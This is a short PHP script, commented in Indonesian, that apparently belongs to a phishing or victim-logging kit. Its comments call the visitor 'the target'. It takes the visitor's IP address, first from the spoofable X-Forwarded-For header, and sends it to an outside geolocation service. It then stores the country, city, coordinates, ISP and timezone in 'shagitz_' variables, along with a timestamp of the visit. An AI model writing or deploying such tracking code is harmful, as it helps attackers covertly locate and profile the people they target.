<?php
// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Mengambil IP asli dari header X-Forwarded-For
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    // Jika ada beberapa IP dalam X-Forwarded-For, ambil yang pertama
    $ipaddress = explode(',', $ipaddress)[0];

    return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "https://get-api.gungratech.com/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
    curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$shagitz_ipaddress = getClientIP();
$shagitz_continent = $data['benua'];
$shagitz_flag = $data['flag'];
$shagitz_country = $data['negara'];
$shagitz_countryCode = $data['country_code'];
$shagitz_regionName = $data['provinsi'];
$shagitz_city = $data['kota'];
$shagitz_callcode = $data['callcode'];
$shagitz_latitude = $data['latitude'];
$shagitz_longitude = $data['longitude'];
$shagitz_timezone = $data['timezone'];
$shagitz_isp = $data['isp'];
$shagitz_as = $data['connection'];

date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');
$yearNow = date('Y');

?>